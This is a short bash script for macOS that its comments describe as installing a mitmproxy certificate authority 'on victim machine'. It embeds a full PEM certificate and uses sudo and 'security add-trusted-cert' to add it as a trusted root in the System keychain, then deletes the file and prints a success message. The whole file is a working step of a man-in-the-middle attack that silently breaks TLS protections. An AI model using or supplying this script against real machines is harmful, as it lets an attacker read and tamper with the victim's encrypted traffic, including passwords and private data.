#!/bin/bash
# Install mitmproxy CA certificate on victim machine (Mac)
# Run this on the victim machine to trust the MITM CA cert

sudo bash -c 'echo "-----BEGIN CERTIFICATE-----
MIIDNTCCAh2gAwIBAgIUNzgQwF0M7iozioXGnsRWW7lFQVYwDQYJKoZIhvcNAQEL
BQAwKDESMBAGA1UEAwwJbWl0bXByb3h5MRIwEAYDVQQKDAltaXRtcHJveHkwHhcN
MjYwNzE0MTYwNjU4WhcNMzYwNzExMTYwNjU4WjAoMRIwEAYDVQQDDAltaXRtcHJv
eHkxEjAQBgNVBAoMCW1pdG1wcm94eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAMgarojYLcm7MRY3wYcwqc3IpOLStcNEKBTuoqqbocypK5hUfPZ9zcEJ
8mjrsl+y8YJsXxIEThjhRUTXPISDSmz+lpb16WI9My+0yVuG9Q2jAMUs8w+twna9
G+FFZCCNlHfIw6Y/KajxId02vSzjSHFWXSmiBQ1EIyraILxTorSL6wWHngzQVYnJ
zyaFPsHNaGVHICsNCsnzXTGfAh0C04OUe1y95EdfoehWzYu92wMW83l/COURb2kW
W43ktPsbNFCR1BOPx4J9gRgKuzFMXZwCd4AMikmIyjF9wPz2AQ0oJcj8Sawk976a
U/lqM1I565iZne6tKbh9jKiJ8RuzLCUCAwEAAaNXMFUwDwYDVR0TAQH/BAUwAwEB
/zATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCAQYwHQYDVR0OBBYE
FNra1wuPly+5whsYAFhIX503brXVMA0GCSqGSIb3DQEBCwUAA4IBAQBE7gwQLO5z
z9Nmb16ILHlDW3bJiMuVCcHhor5P61E4P5AB7cvKLESDP7PQnQIEZWqlNKzFr5W4
078yy6N3P7TdlENWIMWH06XgxsHeUOPmbuYTEnaiXwOId+JewMyVXEbl8A7OCghZ
reMT/SsYXGoGI/8YF4JvE4bcpSSIxcHKXB73DDiGykh0c9xQ3uUQdzDbgWt145+3
a/ot0A3E5IzT67O8fzlGQMosalFU942M0WGWpQSCd3YUxAwk+Aq0xnAHmwOEuogD
irCo2wY1ge1y3kdh7SqSdbp/dNx2oDqwuc6Ln77TLtH7jP54jtiVm53OWokvif8D
VG6hBPgUiQkn
-----END CERTIFICATE-----" > /tmp/mitmproxy-ca-cert.pem && /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/mitmproxy-ca-cert.pem && rm /tmp/mitmproxy-ca-cert.pem && echo "✅ Certificate installed successfully!"'
